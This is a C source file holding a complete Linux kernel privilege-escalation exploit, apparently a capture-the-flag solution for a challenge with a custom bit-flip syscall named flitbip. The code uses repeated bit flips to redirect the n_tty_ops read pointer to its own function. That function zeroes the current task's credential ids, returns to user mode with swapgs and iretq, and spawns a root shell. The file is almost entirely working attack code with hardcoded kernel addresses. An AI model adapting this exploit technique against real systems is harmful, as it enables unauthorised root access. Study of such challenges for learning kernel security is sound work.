#include <stdio.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <unistd.h>

#define FLITBIP 333
#define flitbip(addr, bit) syscall(FLITBIP, addr, bit)
#define TASK_STRUCT_CRED_OFFSET 0x3c0
#define N_TTY_OPS_READ_OFFSET 48

unsigned long *FLIT_COUNT   = (unsigned long *)0xffffffff818f4f78;
unsigned long *CURRENT_TASK = (unsigned long *)0xffffffff8182e040;
unsigned long *N_TTY_OPS    = (unsigned long *)0xffffffff8183e320;
unsigned long *N_TTY_READ   = (unsigned long *)0xffffffff810c8510;

unsigned long SS;
unsigned long RSP;
unsigned long RFLAGS;
unsigned long CS;
unsigned long RIP;

void get_shell(void) {
    puts("Will start the shell...");
    system("/bin/sh");
}

void privilege_escalation(void) {
    // puts("Begin privilege escalation in kernel-land...");
    // puts("Modify creds...");
    // Set all ids from our user one to the root one (0)
    int *cred = *(unsigned long *)((char *)*CURRENT_TASK + TASK_STRUCT_CRED_OFFSET);
    // printf("Cred addr: %lx\n", cred);
    for(int index=1; index<9; index++) {
        // printf("%d\n", cred[index]);
        cred[index] = 0;
        // printf("%d\n", cred[index]);
    }
    // printf("Cred addr: %lx\n", cred);

    *(unsigned long **)((char *)N_TTY_OPS + N_TTY_OPS_READ_OFFSET) = N_TTY_READ;
    // puts("Will return to user-land...");

    unsigned long sh = (unsigned long)get_shell;

    // Return to user space
    __asm__(
        "swapgs\n"
        "push %0\n"
        "push %1\n"
        "push %2\n"
        "push %3\n"
        "push %4\n"
        // "push 0\n"
        "iretq\n"
        : "=m"(SS), "=m"(RSP), "=m"(RFLAGS), "=m"(CS), "=m"(sh)
    );
}

int main(void) {
    // Save context to get good variables for the return from kernel-land to user-land
    __asm__(
        "mov %%rsp, %0\n"
        "mov %%ss, %1\n"
        "mov %%cs, %2\n"
        "pushf\n"
        "pop %3\n"
        : "=r"(RSP), "=r"(SS), "=r"(CS), "=r"(RFLAGS)
    );
    printf("Context:\n\tSS  : 0x%lx\n\tCS  : 0x%lx\n\tRSP : 0x%lx\n\tFL  : 0x%lx\n", SS, CS, RSP, RFLAGS);

    // Set flit_count to a negative number to allow us do many syscalls
    puts("Enable numerous bit-flips...");
    flitbip(FLIT_COUNT, 63);

    // Write n_tty_ops->read address
    puts("Change control flow...");
    unsigned long mask = (unsigned long)N_TTY_READ ^ (unsigned long)privilege_escalation;
    for(long index=0; index<64; index++) {
        if(mask & (1ULL << index)) {
            flitbip((char *)N_TTY_OPS + N_TTY_OPS_READ_OFFSET, index);
        }
        printf(".");
    }
    puts("");
    
    // Trigger the n_tty_ops->read operation
    char c;
    scanf("%c", &c);

    return 0;
}

